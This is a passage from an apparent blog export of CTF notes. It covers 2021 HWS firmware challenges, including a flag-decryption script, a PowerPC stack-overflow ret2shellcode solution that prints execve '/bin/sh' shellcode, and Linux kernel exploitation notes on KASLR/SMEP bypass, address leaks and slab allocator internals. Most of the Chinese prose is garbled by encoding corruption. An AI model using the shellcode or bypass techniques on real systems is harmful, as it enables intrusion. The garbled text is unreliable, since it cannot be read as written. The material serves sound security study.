/home/goahead/flag.txt\n```\n\nè¿™é‡Œå°±æ˜¯è°ƒç”¨goformçš„æ¥å£APIè¿›è¡Œæµ‹è¯•å³å¯è·å¾—flag\n\n\n\n## 3.httpd\n\nä¸å¤ªä¼š\n\n\n\n## 4.nodemcu\n\nç›´æ¥å‡º\n\n```\nstrings nodemcu.bin\n```\n\n![image-20220120125706243](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201257297.png)\n\nçœ‹æ¥ä»¥åéƒ½å…ˆstringsä¸€æŠŠæ¢­è¯•è¯•\n\n\n\n## 5.easybios\n\n### (1)å‰ç½®æ¢ç´¢\n\næŒ‰ç…§å‘½ä»¤æç¤ºå¯åŠ¨ï¼Œä½†æ˜¯æœ‰æ—¶å€™å¯ä»¥ï¼Œæœ‰æ—¶å€™åˆä¸å¯ä»¥ï¼Œå¯èƒ½åœ¨ç­‰ä¸€ä¸‹å°±å¯ä»¥ï¼Ÿ\n\n![image-20220120130559529](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201305567.png)ç»™äº†æç¤º\n\n![image-20220120130724621](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307664.png)\n\nå°è¯•ä¸€ä¸‹\n\n![image-20220120130702363](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307395.png)\n\n### (2)IDAåˆ†æ\n\nä½¿ç”¨binwalkè§£åŒ…\n\n```\nbinwalk -Me easybios\n```\n\nç„¶åIDAæ‰“å¼€è§£åŒ…å‡ºæ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶\n\n![image-20220120143603848](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201436882.png)\n\næœç´¢ä¸€ä¸‹Wrongå­—ç¬¦ä¸²ï¼Œæ²¡æœåˆ°ï¼Œå°è¯•ç”¨unicodeæ ¼å¼æœç´¢ï¼Œå³UTF-16LEæ ¼å¼ï¼Œä¸€ä¸ªå­—ç¬¦ä¸¤ä¸ªå­—èŠ‚ã€‚\n\n![image-20220120144209024](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201442069.png)\n\nç„¶ååŠ ä¸Š00å³å¯->`57 00 72 00 6F 00 6E 00 67 00`ï¼Œæ‰¾åˆ°ä¸¤ä¸ª\n\n![image-20220120144641985](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201446022.png)\n\n![image-20220120144707349](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447384.png)\n\n![image-20220120144725574](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447608.png)\n\nå¾ˆæ˜æ˜¾åº”è¯¥æ˜¯ä¸‹é¢é‚£ä¸ªï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶æœ‰ç‚¹å¤§ï¼Œä¸å¥½è§£æï¼Œå†åŠ ä¸Šä¹‹å‰åœ¨è§£åŒ…çš„æ—¶å€™çœ‹åˆ°åŒ…å«å¾ˆå¤šPEæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™ä¸ªç¨‹åºåº”è¯¥ä¹Ÿæ˜¯åœ¨ä¸€ä¸ªPEæ–‡ä»¶é‡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾æ®åœ°å€ï¼Œæ‰¾åˆ°å¯¹åº”çš„PEæ–‡ä»¶å¤´å°¾\n\n![image-20220120150501890](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201505983.png)\n\n### (3)åˆ‡å‰²åˆ†æ\n\n#### â‘ å¯»æ‰¾å¤´å°¾åœ°å€\n\nä¾æ®åœ°å€æ‰¾åˆ°ä»¥ä¸‹å¤´å°¾\n\n![image-20220120155301520](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201553654.png)\n\n#### â‘¡ä½¿ç”¨Winhexè¿›è¡Œåˆ‡å‰²\n\nä½¿ç”¨Winhexæ‰“å¼€ï¼Œç„¶åæ‰¾åˆ°å¤´å°¾ï¼Œä½¿ç”¨alt+Gæœç´¢åœ°å€ï¼Œé€‰å®šå¤´å°¾\n\n![image-20220120155739157](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201557194.png)\n\nå¤´éƒ¨\n\n![image-20220120155816532](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201558569.png)\n\nå°¾éƒ¨\n\n![image-20220120155907991](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201559030.png)\n\né€‰ä¸­é€‰å¿«ï¼Œå³é”®ç¼–è¾‘->å¤åˆ¶é€‰å—->è‡³æ–°æ–‡ä»¶ï¼Œç„¶åä¿å­˜ç”¨IDAæ‰“å¼€ï¼Œç…§å¸¸ä½¿ç”¨å…¨å±€æœç´¢å­—ç¬¦`57 00 72 00 6F 00 6E 00 67 00`æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°`sub_31D6F`ï¼Œä¸€ç•ªåˆ¤æ–­å¦‚ä¸‹ï¼š\n\n![image-20220120154940674](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201549732.png)\n\nç„¶åé¡ºç€é€»è¾‘ç†æ¸…æ¥šå³å¯ï¼Œæˆ–è€…å°è¯•ä½¿ç”¨angrè§£é¢˜ï¼Œä»¥ä¸‹expå‚ç…§`lxonzå¸ˆå‚…`\n\n[2021HWSå†¬ä»¤è¥çº¿ä¸Šèµ›å›ºä»¶å®‰å…¨WriteUp|NOSECå®‰å…¨è®¯æ¯å¹³å° - ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é™¢](https://nosec.org/home/detail/4672.html)\n\n```python\ndef print_bytes_hex(data):\n    lin = ['%0x' % i for i in data]\n    print(\"\".join(lin))\n\nmagic = 'OVMF_And_Easy_Bios'\ndemo = [0x46, 0x77, 0x74, 0xb0, 0x27, 0x8e, 0x8f, 0x5b, 0xe9, 0xd8, 0x46, 0x9c, 0x72, 0xe7, 0x2f, 0x5e]\nv13 = [0]*514\nfor i in range(256):\n    v13[i] = i\n    v13[i+256] = ord(magic[i%18])\n\nv2 = 0\nv3 = 0\nnew_list = []\nwhile v2!=256:\n    v4 = v13[v2]\n    v3 = (v13[v2 + 256] + v4 + v3) % 256\n    v5 = v13[v3]\n    v13[v3] = v4\n    v13[v2] = v5\n    v2+=1\n\nv6 = 0\nv7 = 0\nv8 = 0\n\nwhile v6 != 16:\n    v8 = v8 + 1\n    v9 = v13[v8]\n    v10 = (v9 + v7) % 256\n    v11 = v13[v10]\n    v13[v10] = v9\n    v7 = (v9 + v7) % 256\n    v13[v8] = v11\n    result = v13[(v11 + v13[v10]) % 256]\n    new_list.append(result)\n    #(v0 + v6) ^= result\n    v6 += 1\n#print len(demo)\n#print len(new_list)\nflag_list = []\nfor i in range(16):\n    flag_list.append(new_list[i]^demo[i])\n    print(hex(new_list[i]^demo[i]))\nprint_bytes_hex(flag_list)\n#flag{88baec0b5154f859b5851097bb567f5c}\n```\n\n\n\n## 6.PPPPPPC\n\n### (1)è°ƒè¯•\n\npowerpcå¤§ç«¯æ¶æ„\n\nè°ƒè¯•å‘ç°æ ˆæº¢å‡ºï¼Œè¯»å…¥0x320ï¼Œå¹¶ä¸”å˜é‡åç§»åœ¨0x140ï¼Œå¯è¦†ç›–$lrå¯„å­˜å™¨ï¼Œæ§åˆ¶ç¨‹åºæµï¼Œä¿æŠ¤éƒ½æ²¡å¼€ï¼Œå°±å°è¯•ret2shellcode\n\n![image-20220120194956344](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201949396.png)\n\n### (2)æ³„éœ²åœ°å€\n\nä½¿ç”¨é¢˜ç›®ç»™çš„`qemu-ppc-static`æ¥è¿è¡Œä¼šä½¿å¾—ç¨‹åºæ‰“å°æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œè¿œç¨‹ä¹Ÿæ˜¯è¿™æ ·çš„\n\n![image-20220120195324259](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201953531.png)\n\nå‚ç…§å¦‚ä¸‹\n\n![image-20220120195537738](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201955804.png)\n\nè¿œç¨‹è‚¯å®šä¹Ÿæ˜¯qemuï¼Œåœ°å€ä¸ä¼šæ”¹å˜ï¼Œé‚£ä¹ˆå°±å¯ä»¥è·å¾—æ ˆåœ°å€ï¼ŒåŒæ—¶ä¾æ®è°ƒè¯•æ•°æ®ä¹Ÿèƒ½å¾—åˆ°æˆ‘ä»¬è¾“å…¥æ•°æ®çš„ç›¸åº”çš„åç§»\n\n### (3)å¯»æ‰¾shellcode\n\nç›´æ¥å»[shell-storm | Shellcodes Database](http://shell-storm.org/shellcode/)æ‰¾å¯¹åº”çš„shellcode\n\n```\n\"\\x7c\\x3f\\x0b\\x78\"\t/*mr\tr31,r1*/\n\"\\x7c\\xa5\\x2a\\x79\"\t/*xor.\tr5,r5,r5*/\n\"\\x42\\x40\\xff\\xf9\"\t/*bdzl+\t10000454< main>*/\n\"\\x7f\\x08\\x02\\xa6\"\t/*mflr\tr24*/\n\"\\x3b\\x18\\x01\\x34\"\t/*addi\tr24,r24,308*/\n\"\\x98\\xb8\\xfe\\xfb\"\t/*stb\tr5,-261(r24)*/\n\"\\x38\\x78\\xfe\\xf4\"\t/*addi\tr3,r24,-268*/\n\"\\x90\\x61\\xff\\xf8\"\t/*stw\tr3,-8(r1)*/\n\"\\x38\\x81\\xff\\xf8\"\t/*addi\tr4,r1,-8*/\n\"\\x90\\xa1\\xff\\xfc\"\t/*stw\tr5,-4(r1)*/\n\"\\x3b\\xc0\\x01\\x60\"\t/*li\tr30,352*/\n\"\\x7f\\xc0\\x2e\\x70\"\t/*srawi\tr0,r30,5*/\n\"\\x44\\xde\\xad\\xf2\"\t/*.long\t0x44deadf2*/\n\"/bin/shZ\"; // the last byte becomes NULL\n```\n\nå¯¹åº”åç§»æ‰¾åˆ°å³å¯\n\n![image-20220120200332572](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201202003613.png)\n\nè¦†ç›–LRå¯„å­˜å™¨ä¸ºè¯¥åœ°å€å®Œäº‹\n\n\n\n\n\n## 7.easymsg\n\næ²¡çœ‹æ‡‚\n\n\n\n\n\n# äºŒã€çŸ¥è¯†ç‚¹\n\n## 1.å›ºä»¶è§£åŒ…\n\n### (1)binwalk\n\nå¸¸ç”¨çš„å‘½ä»¤\n\n```bash\nbinwalk -Me xxx.bin  #è§£åŒ…\nbinwalk -A xxx.bin #æŸ¥çœ‹æ¶æ„\n```\n\næœ‰æ—¶å€™å¯ä»¥ç”¨mountæŒ‚è½½binwalkæ‰“ä¸å¼€çš„å›ºä»¶\n\n```\nmount ./rootfs.img test\n```\n\n## 2.å›ºä»¶åŠ è§£å¯†\n\n### (1)åˆ¤æ–­åŠ å¯†\n\næœ‰æ—¶å€™å›ºä»¶å¯èƒ½ä¼šè¢«åŠ å¯†ï¼Œå¯ç”¨binwalkçš„ç†µè®¡ç®—æ¥åˆ¤æ–­ï¼Œå‹ç¼©æˆ–è€…åŠ å¯†çš„æ•°æ®å…·æœ‰è¾ƒé«˜çš„ç†µå€¼\n\n```\nbinwalk -E xxx.bin\n```\n\næœªåŠ å¯†çš„\n\n![image-20220121185003706](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850770.png)\n\nåŠ å¯†çš„\n\n![image-20220121185022780](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850841.png)\n\n### (2)è§£å¯†å¸¸è§æ–¹æ³•\n\né€†å‘ï¼Œè‡ªå·±å¯»æ‰¾ç­‰ç­‰\n\n## 3.å›ºä»¶å¯»æ‰¾\n\nç½‘ä¸Šï¼Œå®˜ç½‘å•¥çš„ï¼Œæˆ–è€…ç¡¬ä»¶æå–ï¼Œåæ­£åˆ°æ—¶å€™å†çœ‹ä¸€éæŠŠï¼ŒæœåŠ¡å™¨ï¼Œå¾çˆ±ç ´è§£...\n\nè§‚å¯Ÿä»¥ä¸‹\n\n![image-20220121185648863](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211856001.png)\n","tags":["2021HWSå›ºä»¶å­¦ä¹ "],"categories":["2021HWSå›ºä»¶å­¦ä¹ "]},{"title":"kernelç¬”è®°æ±‡æ€»","url":"/2022/01/14/kernelç¬”è®°æ±‡æ€»/","content":"# ä¸€ã€å¸¸è§ä¿æŠ¤\n\n## 1.KPTI\n\nåœ¨v4.15ä¹‹åä¼šé»˜è®¤å¼€å¯\n\nå†…æ ¸é¡µè¡¨éš”ç¦»ï¼Œå¼€å¯ä¹‹åå¯ä»¥è®¿é—®ç”¨æˆ·ç©ºé—´å†…å­˜ï¼Œä½†æ˜¯ä¸èƒ½æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç \n\nå³æ— æ³•ç›´æ¥é€šè¿‡æ„é€ swapgs_iretqçš„ROPæ¥è¿”å›ç”¨æˆ·æ€ï¼Œå¯å‚è€ƒç»•è¿‡\n\n[Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/240006#h3-2)\n\n```\ncat /sys/devices/system/cpu/vulnerabilities/*\n```\n\n![image.png](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png)\n\nè¿™ä¸ªä¹Ÿæœ‰ç±»ä¼¼çš„å¯åŠ¨è„šæœ¬\n\n```\n-append \"console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on\" \\\n```\n\n## 2.SMEPã€SMAPã€KASLRç­‰\n\nè¿™ä¸ªç›´æ¥çœ‹å¯åŠ¨è„šæœ¬\n\n### (1)SMEPå’ŒSMAP\n\nå¯ä»¥é€šè¿‡ROPä¿®æ”¹CR3å¯„å­˜å™¨æ¥ç»•è¿‡\n\n### (2)KASLR\n\né€šå¸¸éœ€è¦æ³„éœ²åœ°å€ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰åŸºåœ°å€\n\n```\ncat /proc/kallsyms | grep startup_64\n```\n\n![image-20220118120655137](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206238.png)\n\nä½†æ˜¯ä¹Ÿå¯ä»¥çˆ†ç ´ï¼ŒKASLRçš„éšæœºåŒ–ç¨‹åº¦åªæœ‰9bitï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½çˆ†ç ´çš„ï¼Œå‚è€ƒä¹‹åçš„çˆ†ç ´KASLRçš„æ¨¡æ¿\n\n\n\n## 3.å…¶ä»–ä¿æŠ¤\n\n### (1)STACK PROTECTOR\n\nç±»ä¼¼ç”¨æˆ·æ€çš„cancary\n\n### (2)å‚è€ƒREADME.MD\n\næœ‰æ—¶å€™å‡ºé¢˜äººç»™çš„README.MDä¼šç»™é…ç½®\n\n```\nCONFIG_SLAB=y\nCONFIG_SLAB_FREELIST_RANDOM=y\nCONFIG_SLAB_FREELIST_HARDENED=y\nCONFIG_HARDENED_USERCOPY=y\nCONFIG_STATIC_USERMODEHELPER=y\nCONFIG_STATIC_USERMODEHELPER_PATH=\"\"\n```\n\nå¦‚ä¸Šå°±æ˜¯ä½¿ç”¨SLABåˆ†é…ï¼Œå¼€å¯RANDOMå’ŒHARDENEDä¿æŠ¤ï¼Œä»¥åŠHardened Usercopyï¼ˆå†…æ ¸ç©ºé—´æŒ‡é’ˆä¹Ÿä¼šè¿›è¡Œéå¸¸ä¸¥æ ¼çš„å®‰å…¨æ€§æ£€æŸ¥ï¼ŒåŒ…æ‹¬ä¸å…è®¸ä¸ºç©ºæŒ‡é’ˆã€ä¸å…è®¸æŒ‡å‘ `kmalloc` åˆ†é…çš„é›¶é•¿åº¦åŒºåŸŸã€ä¸å…è®¸æŒ‡å‘å†…æ ¸ä»£ç æ®µã€å¦‚æœæŒ‡å‘ Slab åˆ™ä¸å…è®¸è¶…è¿‡ Slab åˆ†é…å™¨åˆ†é…çš„é•¿åº¦ã€å¦‚æœæ¶‰åŠåˆ°æ ˆåˆ™ä¸å…è®¸è¶…å‡ºå½“å‰è¿›ç¨‹çš„æ ˆç©ºé—´ç­‰ç­‰ã€‚ï¼‰å’Œ `Static Usermodehelper Path`ï¼ˆmodprobe_path ä¸ºåªè¯»ï¼Œä¸å¯ä¿®æ”¹ï¼‰\n\nå‚è€ƒï¼š[ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£ - arttnba3's blog](https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/)\n\n\n\n\n\n\n\n# äºŒã€æ³„éœ²åœ°å€\n\nä¸€èˆ¬æ˜¯å¼€å¯KASLRçš„æ—¶å€™å¯»æ‰¾åœ°å€\n\nå‚ç…§ï¼š[ä¿¡æ¯æ³„æ¼ - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/kernel-mode/defense/access-control/information-disclosure/)\n\n## 1.å¸¸ç”¨æ–¹æ³•\n\n### Dmesg\n\næ˜¾ç¤ºå¯åŠ¨æ—¶çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­è‚¯å®šåŒ…å«å¾ˆå¤šå‡½æ•°åœ°å€\n\nå½“è®¾ç½®å¦‚ä¸‹å³ä¸èƒ½å†ç”¨\n\n- å¯åŠ¨æ—¶`echo 1 > /proc/sys/kernel/dmesg_restrict`ï¼Œå³è®¾ç½®`dmesg_restrict`ä¸º1\n- ç¼–è¯‘å†…æ ¸æ—¶`CONFIG_SECURITY_DMESG_RESTRICT=y`ï¼Œè¿™ä¸ªæ•ˆæœç­‰åŒ\n\n### kallsyms\n\nä¿å­˜æ‰€æœ‰å‡½æ•°åœ°å€(å…¨å±€çš„ã€é™æ€çš„)å’Œéæ ˆæ•°æ®å˜é‡åœ°å€\n\nå½“å…¶ä¸­çš„å€¼å¦‚ä¸‹æ—¶å¯¹åº”æ‰€ç¤ºæƒ…å†µï¼Œä¸€èˆ¬é¢˜ç›®å¯åŠ¨æ—¶ç›´æ¥\n\n`echo 2 > /proc/sys/kernel/kptr_restrict`\n\n- 0ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚\n- 1ï¼šä½¿ç”¨ `ï¼…pK` è¾“å‡ºçš„å†…æ ¸æŒ‡é’ˆåœ°å€å°†è¢«æ›¿æ¢ä¸º 0ï¼Œé™¤éç”¨æˆ·å…·æœ‰`CAP_ SYSLOG`ç‰¹æƒï¼Œå¹¶ä¸” `group id`å’ŒçœŸæ­£çš„ id ç›¸ç­‰ã€‚(è¿™ä¸ªä¸å¤ªæ‡‚ï¼Œrootç”¨æˆ·å°±å¯ä»¥çœ‹åˆ°)\n- 2ï¼šä½¿ç”¨ `ï¼…pK` è¾“å‡ºçš„å†…æ ¸æŒ‡é’ˆéƒ½å°†è¢«æ›¿æ¢ä¸º 0 ï¼Œå³ä¸æƒé™æ— å…³ã€‚(rootç”¨æˆ·ä¹Ÿçœ‹ä¸åˆ°ï¼Œéœ€è¦åœ¨å¯åŠ¨æ—¶å»æ‰è¿™ä¸ªæ‰è¡Œ)\n\n### module\n\nè¿™ä¸ªæ˜¯ç”¨æ¥è·å–æ¨¡å—åŠ è½½åœ°å€çš„\n\n```bash\ncat /sys/module/module_name/sections/.text\n```\n\nä½†æ˜¯å½“ç¼–ç¨‹æ—¶æ•…æ„å°†æ¨¡å—éšè—èµ·æ¥çš„è¯ï¼Œå°±ä¸ä¼šè¢«æŸ¥çœ‹åˆ°äº†ï¼Œä¸‹é¢æœ‰è®²åˆ°ã€‚\n\n\n\n# ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸\n\n```bash\napt search linux|grep linux-image\n```\n\nè‚¯å®šä¸å¤ªå…¨ï¼Œå½“ç„¶ä¸åŒçš„aptæºå¯¹åº”ä¸åŒçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯å­¦ä¼šè‡ªå·±ç¼–è¯‘å†…æ ¸æœ€å¥½ã€‚\n\nè¿™ç§æ–¹æ³•ä¸‹è½½ä¸‹æ¥æ²¡æœ‰ç¬¦å·è¡¨ï¼Œå¯ä»¥é€šè¿‡[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)æ¥è·å–ç¬¦å·è¡¨\n\n\n\n# å››ã€æ‰“å°åœ°å€\n\n## 1.å¸¸è§„æ‰“å°\n\n```\nprintf(\"0x%lx\\n\",leakAddr);\n```\n\næœ‰æ—¶å€™ä¸åŠ `\\n`æ‰“ä¸å‡ºæ¥\n\n```\n#define HEX(x) printf(\"[*]0x%016lx\\n\", (size_t)x)\n#define LOG(addr) printf(\"[*]%s\\n\", addr)\n```\n\n## 2.gdbå¼æ‰“å°\n\n```c\nvoid gdbPrint(size_t* data,int len)\n{\n    int rowLen = 0;\n    for(int i = 0 ; i < len/0x10 ; i ++)\n    {\n        printf(\"0x%04x\\t\",rowLen);\n        printf(\"0x%016llx  \",*data++);\n        printf(\"0x%016llx\\n\",*data++);\n        rowLen = rowLen+0x10;\n    }\n}\n\nchar data[0x50];\nmemset(data,'\\xaa', 0x10);\nmemset(data+0x10,'\\xbb', 0x20);\ngdbPrint(data,0x50);\n```\n\nå®ç°æ•ˆæœ\n\n![image-20220512151331110](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512151331110.png)\n\n## 3.é¢œè‰²æ‰“å°\n\n\n\n\n\n# äº”ã€æœç´¢å†…å­˜\n\nå½“ä¸çŸ¥é“å†…å­˜åœ¨å“ªé‡Œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨pedaçš„æœç´¢åŠŸèƒ½ï¼Œæœç´¢åœ°å€èŒƒå›´ï¼Œå¸¸å¸¸åœ¨æ“æ§æ ˆæ—¶å¾ˆå¥½ç”¨\n\n```\nfind \"galf\" 0xffffc900001d3f80 0xffffc900001d3f98\n```\n\n![image-20220114170510292](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201141705373.png)\n\n\n\n\n\n# å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨\n\n## 1.å †\n\n### å‰ç½®çŸ¥è¯†\n\n#### åˆ†é…æ–¹å¼\n\né€šå¸¸è€Œè¨€ä¸ºä¸¤ç§åˆ†é…æ–¹å¼SLUBæˆ–è€…SLABï¼ŒSLUBé»˜è®¤ä¼šå¸¦ä¸ŠSLABï¼Œä½†æ˜¯å¯ä»¥è¿›è¡Œè®¾ç½®ï¼Œæ¯”å¦‚åœ¨ç¼–è¯‘å†…æ ¸çš„æ—¶å€™ï¼Œä½¿ç”¨`CONFIG_SLUB=n`ï¼Œ `CONFIG_SLAB=y`è¿™æ ·ç¼–è¯‘å‡ºæ¥çš„å†…æ ¸å°±ä¸€å®šæ˜¯SLABåˆ†é…çš„äº†ã€‚\n\n#### åˆ†é…åŸºåœ°å€\n\nkmalloc ä»çº¿æ€§æ˜ å°„åŒºåˆ†é…å†…å­˜ï¼Œè¿™å—åŒºåŸŸçš„çº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„æ˜¯**è¿ç»­çš„**ï¼Œå…¶èµ·å§‹åœ°å€ä¸º `page_offset_base`ï¼Œåœ¨ä¸å¼€å¯KASLRçš„æƒ…å†µå¦‚ä¸‹ï¼š\n\n![image-20220325143607447](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203251436512.png)\n\n#### kmalloc_caches\n\nä½œä¸ºä¸€ä¸ª`kmem_cache`çš„ç»“æ„ä½“æ•°ç»„ï¼Œç®¡ç†ç€å¤šä¸ª`kmem_cache`ç»“æ„ä½“æŒ‡é’ˆã€‚\n\n![image-20220313124755307](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131247422.png)\n\nä½†æ˜¯ä¸åŒç‰ˆæœ¬ä¸‹ï¼Œç”±äºåˆ†é…æ–¹å¼çš„ä¸åŒï¼Œå¯¼è‡´ä¹Ÿä¼š`kmalloc_caches`çš„ç»“æ„æœ‰ç‚¹å˜åŒ–\n\næ¯”å¦‚åœ¨4.19.98çš„ç‰ˆæœ¬ä¸­ï¼Œ`kmalloc_caches`å°±åªæ˜¯ä¸€ç»´æ•°ç»„\n\n![image-20220313161710623](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617711.png)\n\nè€Œåœ¨5.6çš„ç‰ˆæœ¬ä¸‹ï¼Œ`kmalloc_caches`å˜æˆäº†äºŒç»´æ•°ç»„\n\n![image-20220313161749775](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617882.png)\n\nå¤šå‡ºæ¥çš„ä¸¤ä¸ªä¸€ç»´ç©ºé—´ï¼Œå°±å­˜æ”¾äº†`kmalloc-rcl`å’Œ`dma-kmalloc`ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ç›¸åŒçš„\n\n\n\n\n\n#### SLUBä¸‹\n\né€šå¸¸æˆ‘ä»¬åˆ†é…çš„chunkçš„`freelist`ä¸º`kmalloc_caches[xx].cpu_slab.freelist + CPUX_addr`ï¼Œä¹Ÿå°±æ˜¯å…ˆå¾—åˆ°å¯¹åº”CPUåˆ†é…çš„åŸºåœ°å€ï¼Œç„¶ååŠ ä¸Š`cpu_slab.freelist `å³ä¸ºå¯¹åº”`kmalloc-xx`çš„`freelist`çš„å®é™…åœ°å€ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°\n\n![image-20220316201816364](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162018978.png)\n\nè¿™é‡Œæˆ‘åœ¨itExpä¸­ç»‘å®šäº†ä½¿ç”¨CPU3è¿›è¡Œåˆ†é…\n\n```c\n#define __USE_GNU\n#include <sched.h>\n\ncpu_set_t cpu_mask;\nCPU_ZERO(&cpu_mask);//åˆå§‹åŒ–ä¸º0\nCPU_SET(3,&cpu_mask);//ç»‘å®šCPU3è¿è¡Œç¨‹åº\nsched_setaffinity(getpid(), sizeof(cpu_mask), &cpu_mask);\n```\n\n##### ä¸€ç»´kmalloc_caches\n\n`kmalloc_caches[1]~kmalloc_caches[13]`ä¸º`kmalloc-8`~`kmalloc-8k`\n\nè€Œåœ¨åªæœ‰ä¸€ç»´ç©ºé—´çš„`kmalloc_caches`ä¸­ï¼Œå³ä¸å­˜åœ¨`kmalloc-rcl`å’Œ`dma-kmalloc`çš„ç‰ˆæœ¬ä¸‹ï¼Œæ¯”å¦‚4.19.98\n\nå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œä¹Ÿæ˜¯å¾ˆé¡ºåˆ©åœ°æ”¾å…¥CPU3å¯¹åº”çš„`kmalloc-32`çš„`freelist`ä¸­\n\n![image-20220314122243323](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141222234.png)\n\nä½†æ˜¯CPUä¸ªæ•°çš„ä¸åŒï¼Œåˆ†é…çš„åŸºåœ°å€é€šå¸¸ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸ªå…·ä½“è¿˜æ˜¯çœ‹`__per_cpu_offset`è¿™ä¸ªå…¨å±€å˜é‡ä¸­ä¿å­˜çš„å†…å®¹å§ï¼Œå…·ä½“çš„ç»†èŠ‚ä¸å¤ªçŸ¥é“\n\n![image-20220316201020862](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162010972.png)\n\nå¦‚å›¾ä¸º4ä¸ªCPUçš„æƒ…å†µï¼Œè¿™ä¸ªè¿˜æ˜¯ä¸å¤ªä¸€æ ·çš„ã€‚\n\n\n\n##### å¤šç»´kmalloc_caches\n\n`kmalloc_caches[0][1]~kmalloc_caches[0][13]`ä¸º`kmalloc-8`~`kmalloc-8k`\n\n`kmalloc_caches[1][1]~kmalloc_caches[1][13]`ä¸º`kmalloc-rcl-8`~`kmalloc-rcl-8k`\n\n`kmalloc_caches[2][1]~kmalloc_caches[2][13]`ä¸º`dma-kmalloc-8`~`dma-kmalloc-8k`\n\n![image-20220313160048795](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131600906.png)\n\nå†…å­˜ç®¡ç†å¦‚ä¸‹\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131521126.png)\n\nåœ¨äºŒç»´ç©ºé—´çš„`kmalloc_caches`ä¸‹ï¼Œä¾æ®CPUçš„ä¸åŒï¼Œæœ‰ä¸åŒçš„`freelist`ï¼Œæ¯”å¦‚åœ¨æœ‰4ä¸ªCPUçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ç¨‹åºç»‘å®šåœ¨CPU3ä¸Šï¼Œå¦‚ä¸Šé¢æåˆ°çš„ä¸€æ ·\n\nqemuå¯åŠ¨æ•ˆæœä¹‹åï¼Œè¾“å…¥topï¼Œæ•ˆæœå¦‚ä¸‹\n\n![image-20220314120253236](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141202734.png)\n\n\n\né‚£ä¹ˆæˆ‘ä»¬çš„`itExp`ç¨‹åºç»‘å®šçš„CPU3åˆ†é…åˆ°çš„åŸºåœ°å€å³ä¸º`0xffff88800f380000`ï¼Œç»“åˆ`kmalloc_caches`ä¸­å¯¹åº”`kmalloc-xxx`ä¸‹çš„`cpu_slab.freelist 